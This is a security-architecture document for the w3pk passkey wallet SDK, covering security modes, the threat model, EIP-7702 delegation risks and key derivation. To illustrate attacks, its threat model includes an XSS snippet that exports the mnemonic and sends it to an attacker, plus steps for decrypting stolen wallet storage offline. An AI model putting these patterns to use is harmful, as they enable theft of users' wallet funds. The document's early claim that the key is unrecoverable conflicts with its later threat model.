# Security Architecture

This document explains the security model of w3pk and how wallet protection works.

## Overview

w3pk provides **multiple layers of security** to protect user wallets:

1. **WebAuthn authentication** - Biometric/PIN gating for wallet access
2. **Application isolation** - Apps cannot access master mnemonic
3. **Origin-specific derivation** - Each website gets unique isolated addresses
4. **Mode-based access control** - STANDARD/STRICT modes are view-only, YOLO mode provides full access
5. **Encrypted storage** - AES-256-GCM encryption at rest
6. **Secure sessions** - In-memory and optional persistent sessions (disabled in STRICT mode)
7. **Persistent session encryption** - WebAuthn-derived key encryption for "Remember Me" functionality

## Enhanced Security Model (v0.8.0+)

### Three Security Modes

w3pk now uses **origin-centric security modes** for wallet derivation:

**STANDARD mode (default):**
- ✅ Address only (no private key)
- ✅ Persistent sessions allowed
- ✅ Best for most applications

**STRICT mode:**
- ✅ Address only (no private key)
- ❌ Persistent sessions NOT allowed
- ✅ Requires biometric/PIN authentication every time
- ✅ Best for high-security applications

**YOLO mode:**
- ✅ Full access (address + private key)
- ✅ Persistent sessions allowed
- ⚠️ Use only when private key access is required

### Application Security Guarantees

**What applications CANNOT access:**
- ❌ Master mnemonic (permanently disabled via `exportMnemonic()`)
- ❌ Private keys in STANDARD mode
- ❌ Private keys in STRICT mode
- ❌ Private keys from other origins
- ❌ Private keys from other modes
- ❌ Direct backup/recovery manager access

**What applications CAN access:**
- ✅ Origin-specific address (all modes)
- ✅ Private keys in YOLO mode only
- ✅ Signatures via `signMessage()` (no key exposure)
- ✅ Encrypted backups via SDK methods

### Mode-Based Security Examples

```typescript
// STANDARD mode (default) - Address only, persistent sessions
const wallet = await w3pk.deriveWallet()
// Returns: { address, index, origin, mode: 'STANDARD', tag: 'MAIN' }
// ✅ Safe for display
// ❌ No privateKey in response
// ✅ Uses cached session (no repeated auth)

// STRICT mode - Address only, NO persistent sessions
const strictWallet = await w3pk.deriveWallet('STRICT')
// Returns: { address, index, origin, mode: 'STRICT', tag: 'MAIN' }
// ✅ Safe for display
// ❌ No privateKey in response
// ⚠️ Requires biometric/PIN authentication EVERY time

// YOLO mode - Full access with private key
const yoloWallet = await w3pk.deriveWallet('YOLO')
// Returns: { address, privateKey, index, origin, mode: 'YOLO', tag: 'MAIN' }
// ✅ Full access for transactions
// ⚠️ Application has access to private key

// YOLO mode with custom tag for specific features
const gamingWallet = await w3pk.deriveWallet('YOLO', 'GAMING')
// Returns: { address, privateKey, index, origin, mode: 'YOLO', tag: 'GAMING' }
// ✅ Different address from MAIN
// ✅ Full access for gaming transactions
```

### Multiple Wallet Management

w3pk supports multiple wallets on a single device, but applications should implement safeguards to prevent accidental wallet creation:

**Detection Methods:**

```typescript
// Check if any wallets exist
const hasWallet = await w3pk.hasExistingCredential()

// Get count of wallets
const count = await w3pk.getExistingCredentialCount()

// List all wallets with metadata
const wallets = await w3pk.listExistingCredentials()
// Returns: [{ username, ethereumAddress, createdAt, lastUsed }, ...]
```

**Security Implications:**

1. **Platform Behavior (iOS/macOS):**
   - Multiple passkeys sync via iCloud Keychain
   - Can cause user confusion if not properly managed
   - Each passkey has its own mnemonic (different wallets)

2. **UX Best Practices:**
   - Always check for existing wallets before registration
   - Show warning if user attempts to create multiple wallets
   - List existing wallets and allow selection during login

3. **Valid Use Cases for Multiple Wallets:**
   - Different personas (personal vs business)
   - Testing and development
   - Family members on shared device
   - Migration scenarios

**Recommended Pattern:**

```typescript
// Before registration
const count = await w3pk.getExistingCredentialCount()
if (count > 0) {
  const wallets = await w3pk.listExistingCredentials()
  // Show warning: "You have {count} wallet(s). Creating a new one will generate
  // a DIFFERENT address. Funds sent to different addresses won't be accessible."
  // Offer: [Login to Existing] [Create New Anyway] [Cancel]
}
```

See [Integration Guidelines](./INTEGRATION_GUIDELINES.md#check-for-existing-wallet-first) for complete implementation patterns.

## Message Signing with Mode Selection

The `signMessage()` method now supports **mode and tag selection**, allowing developers to sign messages from specific derived addresses.

### Default Behavior

By default, `signMessage()` uses **STANDARD mode + MAIN tag** (origin-centric):

```typescript
// Default: Sign with STANDARD + MAIN address
const result = await w3pk.signMessage("Hello World")

console.log(result.signature)  // The signature
console.log(result.address)    // Origin-specific STANDARD+MAIN address
console.log(result.mode)       // 'STANDARD'
console.log(result.tag)        // 'MAIN'
console.log(result.origin)     // Current origin
```

### Mode-Based Signing

Choose the appropriate security mode for each signing operation:

```typescript
// STANDARD mode: View-only, persistent sessions
const standard = await w3pk.signMessage("Display balance", {
  mode: 'STANDARD'
})

// STRICT mode: View-only, requires auth every time
const strict = await w3pk.signMessage("Transfer $10000", {
  mode: 'STRICT'
})
// User will be prompted for biometric/PIN authentication

// YOLO mode: Sign from address with private key access
const yolo = await w3pk.signMessage("Gaming transaction", {
  mode: 'YOLO',
  tag: 'GAMING'
})
```

### Multi-Address Signing

Sign from different addresses for different purposes:

```typescript
// Different tags for different features
const mainSig = await w3pk.signMessage("msg", {
  tag: 'MAIN'
})

const gamingSig = await w3pk.signMessage("msg", {
  mode: 'YOLO',
  tag: 'GAMING'
})

const tradingSig = await w3pk.signMessage("msg", {
  mode: 'YOLO',
  tag: 'TRADING'
})

// Each signature comes from a different address!
console.log(mainSig.address !== gamingSig.address)      // true
console.log(gamingSig.address !== tradingSig.address)   // true
```

### Security Best Practices

**When to use each mode:**

| Mode | Use Case | Private Key Exposed | Sessions |
|------|----------|---------------------|----------|
| STANDARD | Most applications | ❌ No | ✅ Yes |
| STRICT | Banking, high-value | ❌ No | ❌ No |
| YOLO | Gaming, low-value | ✅ Yes | ✅ Yes |

**Examples:**

```typescript
// Financial application: Use STRICT mode
async function signTransfer(amount: number, recipient: string) {
  const result = await w3pk.signMessage(
    `Transfer ${amount} to ${recipient}`,
    { mode: 'STRICT' }  // Always requires auth
  )
  return result.signature
}

// Gaming application: Use YOLO mode with custom tag
async function signGameAction(action: string) {
  const result = await w3pk.signMessage(action, {
    mode: 'YOLO',
    tag: 'GAMING'
  })
  return {
    signature: result.signature,
    fromAddress: result.address  // Gaming-specific address
  }
}

// Display/view operations: Use STANDARD mode (default)
async function signProof() {
  const result = await w3pk.signMessage("Prove ownership")
  return result.signature
}
```

### Address Verification

Always verify which address signed a message:

```typescript
const result = await w3pk.signMessage("Important message", {
  mode: 'YOLO',
  tag: 'TRADING'
})

// Verify the signature is from the expected address
const wallet = await w3pk.deriveWallet('YOLO', 'TRADING')
console.assert(
  result.address === wallet.address,
  "Signature must be from trading address"
)

// Use ethers to verify the signature
import { verifyMessage } from 'ethers'
const recovered = verifyMessage("Important message", result.signature)
console.assert(
  recovered.toLowerCase() === result.address.toLowerCase(),
  "Signature verification failed"
)
```

## Traditional Security Guarantees

### ✅ Protected Against

1. **File System Access** - Attacker with access to browser storage cannot decrypt wallet
2. **Malware/Keyloggers** - Encryption key never exists in recoverable form
3. **Memory Dumps** - Keys are ephemeral and derived on-demand
4. **Database Theft** - Encrypted wallet is useless without biometric authentication
5. **JavaScript Injection** - Cannot replay signatures (fresh challenge each time)

### ⚠️ NOT Protected Against

1. **Physical coercion** - Forcing user to authenticate
2. **Compromised authenticator** - If hardware is backdoored
3. **Active browser session** - If wallet is in memory and user is authenticated
4. **Offline mnemonic theft** - If attacker has browser storage files (see Threat Model below)
5. **XSS with active session** - Code injection during authenticated session

## Threat Model

Understanding w3pk's security boundaries is critical for proper deployment. The security model relies on **multiple layers of protection**, not just encryption.

### Security Layers (Strongest to Weakest)

#### 1. WebAuthn Authentication (Strongest Boundary) ✅

**What it protects:**
- Unauthorized access via w3pk SDK
- Remote attacks without physical device access
- Phishing attacks (domain-scoped credentials)
- Cross-site attacks (origin isolation)

**How it works:**
- Browser enforces biometric/PIN authentication
- Cannot be bypassed without physical access + user authentication
- User sees domain in authentication prompt
- Credentials are cryptographically bound to domain

**Limitations:**
- Requires user interaction (can be socially engineered)
- User must verify domain in prompt (many users don't)
- Doesn't protect against session hijacking after authentication

#### 2. Deterministic Encryption (Strong Protection) ⚠️

**What it protects:**
- Casual file system access (encrypted at rest)
- Database theft without credential metadata
- Quick opportunistic attacks

**How it works:**
- Wallet encrypted with AES-256-GCM
- Key derived from credential ID + public key (PBKDF2, 210k iterations)
- Requires both localStorage (metadata) AND IndexedDB (encrypted wallet)

**Limitations:**
- **Key is deterministic** - same metadata = same key
- An attacker with BOTH localStorage AND IndexedDB can decrypt offline
- Does NOT require fresh authentication to derive the key
- Protection is authentication-gating by SDK, not cryptographic impossibility

**Honest assessment:**
```typescript
// What an attacker with file access CAN do:
const key = deriveEncryptionKeyFromWebAuthn(stolenCredentialId, stolenPublicKey)
const mnemonic = decryptData(stolenEncryptedWallet, key)
// ✅ SUCCESS - Attacker now has the mnemonic

// What they CANNOT do (without further attacks):
await w3pk.login()  // ❌ Requires WebAuthn authentication
await w3pk.signTransaction(...)  // ❌ Requires WebAuthn authentication

// What they CAN do (outside w3pk):
// Import mnemonic into MetaMask, Ledger Live, etc.
// ✅ Full wallet access if they have the mnemonic
```

**This is why device security is critical:**
- Use device encryption (FileVault, BitLocker)
- Use strong device passwords
- Don't leave device unlocked
- Browser storage is NOT enough protection alone

#### 3. Session Management (Moderate Protection) ⚠️

**What it protects:**
- Time-limited exposure after authentication
- Automatic expiration of cached credentials
- Cleared on browser close

**How it works:**
- Decrypted mnemonic cached in memory only
- Expires after configured duration (default: 1 hour)
- Never written to disk

**Limitations:**
- **Active session = mnemonic in memory**
- Code injection during session can access wallet
- `requireAuth` flag can be bypassed by attacker with JS execution
- Session is in the same JavaScript context as page code

**Attack window:**
```typescript
// Attacker with XSS access during active session:
if (w3pk.hasActiveSession()) {
  const mnemonic = await w3pk.exportMnemonic({ requireAuth: false })
  // ⚠️ SUCCESS - Session allows access, requireAuth is bypassable
  sendToAttacker(mnemonic)
}

// After session expires:
const mnemonic = await w3pk.exportMnemonic({ requireAuth: false })
// ❌ BLOCKED - Session expired, triggers authentication prompt
```

**Mitigation:**
- Use short sessions (`sessionDuration: 0.1` = 6 minutes)
- Or disable sessions entirely (`sessionDuration: 0`)
- Prevent XSS (CSP, input sanitization)

#### 4. `requireAuth` Flag (Weak - UX Only) ❌

**What it protects:**
- User mistakes (accidental clicks)
- Application-level policy enforcement
- User experience (confirmation for sensitive actions)

**How it works:**
- Developer sets `requireAuth: true` for sensitive operations
- SDK triggers fresh authentication prompt

**Limitations:**
- **NOT a security boundary**
- Can be trivially bypassed by code injection:
  ```typescript
  // Attacker bypasses requireAuth
  await w3pk.exportMnemonic({ requireAuth: false })  // ✅ Bypassed
  ```
- Only protects against honest mistakes, not malicious attacks
- Think: seatbelt reminder, not bulletproof vest

**When it helps:**
- Preventing accidental high-value transactions
- Compliance requirements (audit trails showing authentication)
- User education (prompting awareness of sensitive operations)

**When it doesn't help:**
- XSS attacks (attacker controls the JavaScript)
- Malicious browser extensions
- Compromised dependencies
- Any scenario where attacker has code execution

### Threat Scenarios Matrix

| Threat | Layer 1 (WebAuthn) | Layer 2 (Encryption) | Layer 3 (Session) | Layer 4 (requireAuth) | Overall |
|--------|-------------------|---------------------|------------------|----------------------|---------|
| **File system access** | ✅ Blocks SDK use | ⚠️ Can decrypt offline | N/A | N/A | ⚠️ Mnemonic exposed |
| **Malware (no session)** | ✅ Blocks SDK | ⚠️ Can decrypt offline | ✅ No cache | N/A | ⚠️ Mnemonic exposed |
| **Malware (active session)** | ✅ Blocks new auth | ⚠️ Can decrypt offline | ❌ Cache accessible | ❌ Bypassable | ❌ Full access |
| **XSS (no session)** | ⚠️ Phishable | ⚠️ Can decrypt offline | ✅ No cache | N/A | ⚠️ Needs auth prompt |
| **XSS (active session)** | ⚠️ Phishable | ⚠️ Can decrypt offline | ❌ Cache accessible | ❌ Bypassable | ❌ Full access |
| **Phishing attack** | ✅ Domain isolation | ✅ Different RP ID | N/A | N/A | ✅ Protected |
| **Database theft only** | ✅ No metadata | ✅ Need metadata | N/A | N/A | ✅ Protected |
| **Credential theft only** | ✅ Need encrypted wallet | ✅ No wallet | N/A | N/A | ✅ Protected |
| **Physical coercion** | ❌ Can force auth | N/A | ❌ Can establish session | ❌ Bypassable | ❌ Vulnerable |
| **Device theft (locked)** | ✅ Need device unlock | ✅ Device encryption helps | N/A | N/A | ✅ Protected |
| **Device theft (unlocked)** | ⚠️ Can auth | ⚠️ Can access files | ⚠️ May have session | ❌ Bypassable | ❌ Vulnerable |
| **Remote network attack** | ✅ Need physical access | ✅ Need physical access | ✅ Not over network | N/A | ✅ Protected |

### Key Takeaways

**What w3pk IS:**
- ✅ Protection against remote attacks without device access
- ✅ Protection against credential theft from other domains (phishing)
- ✅ Protection against accidental leaks (encryption at rest)
- ✅ Protection against keyloggers (no password needed)
- ✅ Better than password-based wallets for online threats

**What w3pk IS NOT:**
- ❌ Protection against offline mnemonic extraction (if attacker has storage files)
- ❌ Protection against code injection with active session (XSS during session)
- ❌ Protection against physical device compromise (need device encryption + strong password)
- ❌ Immune to social engineering (user can be tricked into authenticating)

**Comparison to other approaches:**

| Security Model | w3pk | MetaMask | Hardware Wallet |
|---------------|------|----------|-----------------|
| Remote attack protection | ✅ Strong | ⚠️ Password-dependent | ✅ Strong |
| Local file access | ⚠️ Can decrypt | ⚠️ Can decrypt | ✅ Cannot decrypt |
| Active session compromise | ❌ Vulnerable | ❌ Vulnerable | ⚠️ Per-tx approval |
| Physical theft (locked) | ✅ Protected | ⚠️ Password-dependent | ✅ Protected |
| User experience | ✅ Biometric | ⚠️ Password typing | ⚠️ Hardware required |

**Recommendation:** w3pk is best suited for:
- Applications where user convenience is important
- Scenarios where remote attacks are the primary threat
- Use cases with short sessions or disabled sessions for sensitive operations
- Combined with device encryption and strong device passwords
- Not as a replacement for hardware wallets for high-value holdings (>$10k)

---

## EIP-7702 Authorization Security

EIP-7702 allows EOAs to delegate code execution to smart contracts through authorization signatures. This is a powerful feature that enables gasless transactions, but requires careful security considerations.

### What is EIP-7702?

EIP-7702 authorizations allow an EOA to **permanently delegate** its code execution to a contract until explicitly revoked. This enables:
- Gasless transactions (sponsor pays gas)
- Smart contract wallet features on regular EOAs
- Account abstraction without deployment

**Critical: Authorizations are PERSISTENT** - they remain active until revoked, not just for a single transaction.

### Security Model

#### Authorization Lifecycle

1. **Sign Authorization (Offline)** - User signs authorization with `signAuthorization()`
2. **First Transaction** - Authorization included in transaction, establishes permanent delegation
3. **All Future Transactions** - Delegation persists, no new authorization needed
4. **Revocation (Manual)** - User must explicitly sign new authorization to revoke

#### Threat Analysis

**✅ Protected Against:**
- Unauthorized signing (requires WebAuthn or active session)
- Phishing (authorization bound to specific contract address + chain ID)
- Replay attacks (nonce-based protection)
- Cross-chain attacks (chain ID binding)

**⚠️ Requires Careful Handling:**
- **Permanent delegation** - User authorizes contract INDEFINITELY
- **Contract security** - If contract is malicious/buggy, user's EOA is compromised
- **No automatic expiration** - Delegation persists until manual revocation
- **Contract upgrades** - If delegated contract is upgradeable, consider upgrade risks

**❌ NOT Protected Against:**
- Malicious contracts (user must verify contract is trustworthy)
- Social engineering (user can be tricked into authorizing bad contracts)
- XSS during active session (can call `signAuthorization()` without auth)

### Security Best Practices

#### 1. Contract Verification (CRITICAL)

**DO:**
- ✅ Only authorize audited, verified contracts
- ✅ Verify contract address matches expected contract
- ✅ Check contract is not upgradeable, or understand upgrade mechanism
- ✅ Understand what the contract can do with your account
- ✅ Test with small amounts first
- ✅ Monitor authorization usage on-chain

**DON'T:**
- ❌ Authorize unknown or unaudited contracts
- ❌ Sign authorizations from untrusted UIs
- ❌ Assume authorization is "temporary" or "one-time"
- ❌ Ignore warnings about permanent delegation

**Example - Safe Authorization:**

```typescript
// GOOD: Verify contract before authorizing
const VERIFIED_GOV_CONTRACT = '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1'
const AUDIT_REPORT = 'https://audits.example.com/gov-v1.pdf'

// Show user what they're authorizing
console.log(`
⚠️  AUTHORIZATION WARNING
You are about to PERMANENTLY delegate your account to:
Contract: ${VERIFIED_GOV_CONTRACT}
Purpose: Gasless governance voting
Audit: ${AUDIT_REPORT}

This delegation will persist until you explicitly revoke it.
`)

// Only proceed with user confirmation
if (await getUserConfirmation()) {
  const auth = await w3pk.signAuthorization({
    contractAddress: VERIFIED_GOV_CONTRACT,
    chainId: 11155111,
    requireAuth: true  // Force fresh authentication
  })
}
```

#### 2. Session Management

**For sensitive operations, force fresh authentication:**

```typescript
// GOOD: Require fresh biometric authentication
const authorization = await w3pk.signAuthorization({
  contractAddress: govContract,
  chainId: 1
}, {
  requireAuth: true  // User must authenticate
})

// BAD: Uses cached session (vulnerable to XSS)
const authorization = await w3pk.signAuthorization({
  contractAddress: govContract,
  chainId: 1
  // No requireAuth - uses session if available
})
```

**Recommendation:** Always use `requireAuth: true` for EIP-7702 authorizations to ensure user consciously approves the permanent delegation.

#### 3. Monitoring and Revocation

**Check if account is already authorized:**

```typescript
import { publicClient } from 'viem'

// Check if EOA has delegated code
const code = await publicClient.getCode({ address: userAddress })
const isAuthorized = code && code.length > 2

if (isAuthorized) {
  console.log('⚠️  Account already has active delegation')
  // Show user current delegation details
  // Offer to revoke if desired
}
```

**Revoke delegation when no longer needed:**

```typescript
// Revoke by delegating to zero address
const revocation = await w3pk.signAuthorization({
  contractAddress: '0x0000000000000000000000000000000000000000',
  chainId: 11155111,
  nonce: currentNonce + 1n
}, {
  requireAuth: true  // Require authentication to revoke
})

await walletClient.sendTransaction({
  to: userAddress,
  value: 0n,
  authorizationList: [revocation]
})
```

#### 4. Private Key Handling

**For derived and stealth addresses:**

```typescript
// GOOD: Derive key only when needed, clear immediately
const mnemonic = await w3pk.exportMnemonic({ requireAuth: true })
const { privateKey } = deriveWalletFromMnemonic(mnemonic, 5)

const auth = await w3pk.signAuthorization({
  contractAddress: govContract,
  chainId: 1,
  privateKey
})

// Clear sensitive data (JS engine will garbage collect)
privateKey = null
mnemonic = null

// BAD: Store private keys long-term
localStorage.setItem('privateKey', privateKey)  // ❌ NEVER DO THIS
```

#### 5. User Education

**Always inform users about permanent delegation:**

```typescript
// Show clear warning before authorization
const WARNING = `
⚠️  PERMANENT DELEGATION WARNING

You are signing an EIP-7702 authorization that will:
• PERMANENTLY delegate your account to a smart contract
• Allow the contract to execute transactions on your behalf
• Persist until you explicitly revoke it
• Cannot be automatically expired or cancelled

Only proceed if you trust this contract and understand the risks.

Contract: ${contractAddress}
Chain: ${chainId}
`

console.warn(WARNING)
await displayWarningModal(WARNING)
```

### Integration Security

#### Recommended Pattern

```typescript
import { createWeb3Passkey } from 'w3pk'

async function authorizeGovernanceContract() {
  const sdk = createWeb3Passkey({
    sessionDuration: 15,  // Short sessions for security
    onError: (error) => {
      logSecurityEvent('authorization_error', error)
    }
  })

  try {
    // 1. Verify contract (offchain)
    const contractInfo = await fetchContractInfo(GOV_CONTRACT)
    if (!contractInfo.verified || !contractInfo.audited) {
      throw new Error('Contract not verified')
    }

    // 2. Check if already authorized
    const code = await publicClient.getCode({ address: userAddress })
    if (code && code.length > 2) {
      console.log('Already authorized')
      return
    }

    // 3. Show warning to user
    const confirmed = await showAuthorizationWarning(contractInfo)
    if (!confirmed) return

    // 4. Sign with fresh authentication
    const authorization = await sdk.signAuthorization({
      contractAddress: GOV_CONTRACT,
      chainId: CHAIN_ID,
      nonce: 0n
    }, {
      requireAuth: true  // Force biometric/PIN
    })

    // 5. Submit first transaction
    const hash = await walletClient.sendTransaction({
      to: GOV_CONTRACT,
      data: firstActionData,
      authorizationList: [authorization]
    })

    // 6. Monitor transaction
    const receipt = await publicClient.waitForTransactionReceipt({ hash })

    // 7. Log successful authorization
    logSecurityEvent('authorization_success', {
      contract: GOV_CONTRACT,
      chainId: CHAIN_ID,
      txHash: hash
    })

    // 8. Store authorization record for user
    await storeAuthorizationRecord({
      contract: GOV_CONTRACT,
      chainId: CHAIN_ID,
      timestamp: Date.now(),
      txHash: hash
    })

  } catch (error) {
    logSecurityEvent('authorization_failed', error)
    throw error
  }
}
```

### Comparison to Other Signing Methods

| Security Aspect | `signMessage()` | `signAuthorization()` |
|----------------|-----------------|----------------------|
| **Scope** | One message | Permanent delegation |
| **Duration** | Single use | Until revoked |
| **Risk level** | Low | High |
| **Requires fresh auth** | Optional | Recommended (always) |
| **Contract verification** | N/A | Critical |
| **Can be phished** | Signature only | Entire account |
| **Revocation needed** | N/A | Yes |

### Key Takeaways

1. **EIP-7702 is NOT temporary** - Delegation persists indefinitely
2. **Always verify contracts** - Malicious contract = compromised account
3. **Use `requireAuth: true`** - Force fresh authentication for authorizations
4. **Monitor authorizations** - Check on-chain code regularly
5. **Educate users** - Make delegation persistence crystal clear
6. **Implement revocation** - Provide easy way to revoke when needed
7. **Log security events** - Track authorizations for security monitoring

**For more details, see:**
- [EIP-7702 Complete Guide](./EIP_7702.md)
- [signAuthorization() API Reference](./API_REFERENCE.md#signauthorization)
- [EIP-7702 Specification](https://eips.ethereum.org/EIPS/eip-7702)

---

## Security Changelog

This section tracks major security-related changes to w3pk's implementation.

### v0.7.0+ (Current)

#### Removed: `deriveEncryptionKeyFromSignature()` (Commit 182740c)
**Impact:** Security improvement

**What changed:**
- Removed the `deriveEncryptionKeyFromSignature()` function
- This was a testing/legacy fallback for signature-based key derivation
- Code comment warned: "Does NOT require biometric authentication for decryption"

**Why this improves security:**
- Eliminates a weaker encryption path that could have been misused
- Reduces code complexity and potential for developer errors
- Single clear encryption method (`deriveEncryptionKeyFromWebAuthn()`)
- Prevents accidental use of signature-based approach without proper session management

**Migration:** No action needed. This function was never the primary method and was only used for testing.

#### Current Encryption Method
**Primary:** `deriveEncryptionKeyFromWebAuthn(credentialId, publicKey)`
- Deterministic key derivation from credential metadata
- PBKDF2 with 210,000 iterations (OWASP 2023)
- Fixed salt: `"w3pk-salt-v4"`
- Security relies on SDK authentication-gating

**Status:** Working as intended. This approach enables session management while maintaining security through WebAuthn authentication requirements.

### v0.7.0 - RP ID Auto-Detection (Security Hardening)

**What changed:**
- Removed manual `rpId` configuration option
- RP ID now automatically set to `window.location.hostname`
- Cannot be overridden by developers

**Why this improves security:**
- Prevents misconfiguration that could lead to security vulnerabilities
- Enforces domain isolation (credentials can't be shared across origins)
- Eliminates risk of developers setting overly broad RP IDs
- Simplifies API and reduces surface for errors

**Migration:**
```typescript
// v0.6.0 (old - REMOVED)
const w3pk = createWeb3Passkey({
  rpId: 'example.com',  // Manual configuration (now removed)
})

// v0.7.0+ (current - REQUIRED)
const w3pk = createWeb3Passkey({
  // rpId is auto-detected from window.location.hostname
  // Cannot be overridden
})
```

**Impact:** Breaking change for v0.6.0 users. Credentials created with custom RP IDs may not work. Users must re-register or import mnemonic.

### Backup Encryption Standards

#### Current: PBKDF2 Iterations

**Wallet encryption:** 210,000 iterations (OWASP 2023)
- Primary threat: Online attacks (SDK authentication required)
- PBKDF2 slows down brute force but not primary security boundary
- 210k iterations balance security and performance

**Backup encryption:** 310,000 iterations (OWASP 2025)
- Primary threat: Offline attacks (backups may be on USB/cloud)
- Higher iterations protect against GPU-based brute force
- Performance less critical (one-time backup creation)

**Why different?**
Different threat models require different protections. Backups may be stored offline and face brute force attacks, while wallets are protected by device security and SDK authentication.

**Recommendation:** OWASP updates iteration counts yearly. We plan to update these values as standards evolve, with careful consideration for backward compatibility.

### Password Validation Enhancement

**Added:** `isStrongPassword()` utility
- Minimum 12 characters
- Requires: uppercase, lowercase, numbers, special characters
- Checks against common passwords (password, 123456, qwerty, etc.)
- Score-based validation (≥50/100 required)

**Location:** `src/utils/validation.ts` (exported from main package)

**Usage:**
```typescript
import { isStrongPassword } from 'w3pk'

if (!isStrongPassword(userPassword)) {
  throw new Error('Password too weak')
}
```

**Note:** Password validation is client-side only. Applications should implement server-side validation for production use.

### Known Limitations & Future Improvements

#### Current Limitations

1. **Deterministic Encryption**
   - Current: Key derived deterministically from credential metadata
   - Limitation: Attacker with storage access can decrypt offline
   - Mitigation: SDK authentication-gating + device encryption

2. **Fixed Salt**
   - Current: Uses fixed salt `"w3pk-salt-v4"`
   - Limitation: Not unique per user (though credential ID provides uniqueness)
   - Trade-off: Simplifies implementation, doesn't significantly weaken security

3. **Session Security**
   - Current: Mnemonic cached in JavaScript memory during sessions
   - Limitation: XSS during session can access wallet
   - Mitigation: Short sessions, XSS prevention (CSP)

#### Under Consideration

1. **Web Workers for Session Isolation**
   - Investigate running wallet operations in dedicated Web Worker
   - Would isolate mnemonic from page JavaScript context
   - Challenge: WebAuthn API not available in Workers (requires postMessage)

2. **Per-User Salt Generation**
   - Consider deriving unique salt from credential metadata
   - Would eliminate fixed salt
   - Trade-off: Adds complexity, marginal security benefit

3. **Signature-Based Encryption Option**
   - Consider optional mode that requires fresh signature per operation
   - Would eliminate deterministic key derivation
   - Trade-off: No sessions, biometric prompt every operation
   - Best for ultra-high-security applications

4. **Rate Limiting**
   - Add built-in rate limiting for authentication attempts
   - Track failed attempts, exponential backoff
   - Protection against brute force via authentication

### Reporting Security Issues

If you discover a security vulnerability in w3pk, please report it responsibly:

**Do NOT:**
- Open a public GitHub issue
- Discuss on social media or public forums
- Attempt to exploit in production systems

**Do:**
- Email security details to the maintainers (see README.md)
- Provide detailed reproduction steps
- Wait for confirmation before public disclosure
- Follow responsible disclosure timeline (typically 90 days)

**We will:**
- Acknowledge receipt within 48 hours
- Investigate and provide updates
- Work on a fix and coordinate disclosure
- Credit you in security advisories (if desired)

## How It Works

### 1. Encryption Key Derivation

**The encryption key is derived deterministically from WebAuthn credential metadata:**

```typescript
// During registration, a WebAuthn credential is created
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: crypto.getRandomValues(new Uint8Array(32)),
    rpId: window.location.hostname,
    userVerification: "required" // Force biometric/PIN
  }
})

// Store credential metadata (public information)
const credentialId = credential.id
const publicKey = credential.response.getPublicKey()

// Derive encryption key from credential metadata (deterministic)
const key = await deriveEncryptionKeyFromWebAuthn(
  credentialId,  // Unique identifier for this credential
  publicKey      // Public key (safe to store)
)

// Encrypt wallet with derived key
const encryptedWallet = await encryptData(mnemonic, key)
```

**How the key derivation works:**

```typescript
// PBKDF2 key derivation
const keyMaterial = credentialId + publicKey  // Concatenate metadata
const salt = "w3pk-salt-v4"                   // Fixed salt (version identifier)
const iterations = 210000                      // OWASP 2023 recommendation

const encryptionKey = await crypto.subtle.deriveKey(
  {
    name: "PBKDF2",
    salt: new TextEncoder().encode(salt),
    iterations: iterations,
    hash: "SHA-256"
  },
  keyMaterial,
  { name: "AES-GCM", length: 256 },
  false,
  ["encrypt", "decrypt"]
)
```

**Important security properties:**

- The encryption key is **deterministic** - the same credential metadata always produces the same key
- An attacker with both localStorage (credential metadata) AND IndexedDB (encrypted wallet) **can derive the encryption key**
- **The actual security boundary is SDK-enforced authentication** - the SDK requires WebAuthn authentication before allowing any operations
- This is **authentication-gated encryption**, not signature-based encryption

**Why this approach is still secure:**

1. **SDK enforces WebAuthn authentication** before any operation:
   ```typescript
   // User must authenticate before the SDK allows decryption
   await w3pk.login()  // ✅ Triggers biometric/PIN prompt
   // Now SDK will decrypt wallet internally
   ```

2. **WebAuthn authentication cannot be bypassed** without:
   - Physical device access AND
   - User's biometric (fingerprint/face) OR device PIN/password
   - Browser shows authentication prompt (user can verify domain)

3. **Even with file access, attacker must authenticate:**
   ```typescript
   // Attacker steals files
   const stolenCredentialId = "..."
   const stolenPublicKey = "..."
   const stolenEncryptedWallet = "..."

   // Can derive the encryption key
   const key = deriveEncryptionKeyFromWebAuthn(stolenCredentialId, stolenPublicKey)

   // Can decrypt the wallet
   const mnemonic = decryptData(stolenEncryptedWallet, key)

   // BUT: To use the wallet via w3pk SDK, must authenticate
   await w3pk.login()  // ❌ BLOCKED: Requires user's biometric/PIN
   ```

4. **Protection from offline attacks:**
   - PBKDF2 with 210,000 iterations slows down brute force
   - But the real protection is that the attacker needs the actual credential metadata (not guessable)
   - Credential IDs are 32+ byte random values (256+ bits of entropy)

**Trade-off: Security vs Usability**

This approach enables **secure sessions**:
- After authentication, the SDK can cache the decrypted mnemonic in memory
- Operations work without repeated biometric prompts for the session duration
- Sessions expire after configured time (default: 1 hour)

An alternative approach (signature-based encryption) would require biometric authentication for every single operation, which is more secure but less usable.

### 2. What's Stored (All Safe to Expose)

#### LocalStorage (Credentials)
```json
{
  "id": "credential-abc123",
  "publicKey": "MFkw...EwYH...AQAB",  // PUBLIC key only
  "username": "alice",
  "ethereumAddress": "0x1234...5678",
  "createdAt": 1234567890
}
```

#### IndexedDB (Encrypted Wallet)
```json
{
  "ethereumAddress": "0x1234...5678",
  "encryptedMnemonic": "v1kT...x3Zp",  // AES-GCM encrypted
  "credentialId": "credential-abc123",
  "createdAt": 1234567890
}
```

**NO secrets stored:**
- No private keys
- No challenge values
- No decryption keys
- Only public identifiers + encrypted data

### 3. Metadata Encryption in LocalStorage (v0.7.4+)

**What changed:**
Starting in v0.7.4, w3pk encrypts sensitive metadata (usernames and Ethereum addresses) in localStorage to prevent XSS attacks from correlating user identities to wallet addresses.

**Previous storage format (before v0.7.4):**
```json
{
  "id": "credential-abc123",
  "publicKey": "MFkw...EwYH...AQAB",
  "username": "alice",                  // ⚠️ PLAINTEXT
  "ethereumAddress": "0x1234...5678",   // ⚠️ PLAINTEXT
  "createdAt": 1234567890
}
```

**New storage format (v0.7.4+):**
```json
{
  "id": "hashed-credential-id",               // SHA-256 hashed
  "encryptedUsername": "v1kT...x3Zp",        // AES-GCM encrypted
  "encryptedAddress": "w2sQ...y4Mp",         // AES-GCM encrypted
  "publicKey": "MFkw...EwYH...AQAB",          // Public key (needed for key derivation)
  "publicKeyFingerprint": "fp1kT...x3Zp",    // SHA-256 hash for verification
  "createdAt": 1234567890,
  "lastUsed": 1234567890
}
```

**Security improvements:**
- ✅ **XSS attacks cannot correlate** usernames to addresses without credential ID
